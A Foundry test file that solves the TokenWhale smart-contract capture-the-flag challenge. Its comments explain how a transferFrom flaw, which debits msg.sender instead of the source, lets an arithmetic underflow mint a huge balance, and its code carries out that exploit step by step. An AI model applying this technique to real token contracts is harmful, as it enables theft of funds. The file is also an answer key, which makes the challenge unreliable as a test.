// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/TokenWhale.sol";

contract TokenWhaleTest is Test {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;
    // Feel free to use these random addresses
    address constant Alice = address(0x5E12E7);
    address constant Bob = address(0x5311E8);
    address constant Pete = address(0x5E41E9);

    function setUp() public {
        // Deploy contracts
        tokenWhale = new TokenWhale(address(this));
        exploitContract = new ExploitContract(tokenWhale);
    }

    // Use the instance tokenWhale and exploitContract
    // Use vm.startPrank and vm.stopPrank to change between msg.sender
    function testExploit() public {

        /**
            1. the beginning balance of play,Alice,Bob is [1000,0,0]
            2. The core problem is the transferFrom(address from, address to, uint256 value), which dosen't check the access control,
                anyone can call this function and can transfer token from anyAddress to toAddress
            3. To let the transferFrom eventually call the   _transfer(to, value), just satisfy the  below conditons
                require(balanceOf[from] >= value);
                require(balanceOf[to] + value >= balanceOf[to]);
                require(allowance[from][msg.sender] >= value);
            4. Because the player's address has 1000 token, so just let Alice call transferFrom(player,Bob,1000).
               Before this step, should let allowance[play][Alice] >= 1000, So just call approve to satisfy the conditon.
            
            5. When execute the _transfer(to, value), the interesting thing is that take the msg.sender as the from. because of overflow, Alice will have huge token
                balanceOf[msg.sender] -= value;
                balanceOf[to] += value;

            6. Then just 1000000 token from Alice to player. 
        
         */
        // Put your solution here
        console.log("the beginning balance of player,Bob,Alice");
        console.log("player",tokenWhale.balanceOf(address(this)));
        console.log("Bob",tokenWhale.balanceOf(Bob)); // Bob
        console.log("Alice",tokenWhale.balanceOf(Alice)); // Alice

        // allowance[address(this)][alice], make the Alice's allownce for player is 1000
        vm.startPrank(address(this)); 
        tokenWhale.approve(Alice,1000);  
        vm.stopPrank();
        console.log("player init",tokenWhale.balanceOf(address(this)));
        
        // Alice transfer token from player to Bob, but eventually Alice's balance has changed so much
        vm.startPrank(Alice); 
        tokenWhale.transferFrom(address(this),Bob,1000);
        vm.stopPrank();

        console.log("After this transfer; the  balance of player,Bob,Alice");
        console.log("player",tokenWhale.balanceOf(address(this)));
        console.log("Bob",tokenWhale.balanceOf(Bob)); // Bob
        console.log("Alice",tokenWhale.balanceOf(Alice)); // Alice

        vm.startPrank(Alice);
        tokenWhale.transfer(address(this),1000000);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenWhale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
